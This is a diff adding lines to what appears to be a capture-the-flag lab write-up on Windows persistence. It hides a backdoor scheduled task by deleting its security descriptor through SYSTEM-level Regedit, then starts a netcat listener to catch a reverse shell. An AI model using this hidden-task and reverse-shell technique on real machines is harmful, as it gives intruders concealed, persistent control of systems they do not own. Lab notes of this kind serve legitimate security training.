@@ -32,3 +32,14 @@ Use `psexec` (available in `C:\tools`) to open `Regedit` with `SYSTEM` privilege
     c:\tools\pstools\PsExec64.exe -s -i regedit
 
 And delete the security descriptor for the task.
+
+Checking, the system reports there is no such task:
+
+    schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
+
+Start a listener on the attack machine:
+
+     nc -nlvp 4449
+
+And a reverse shell.
+
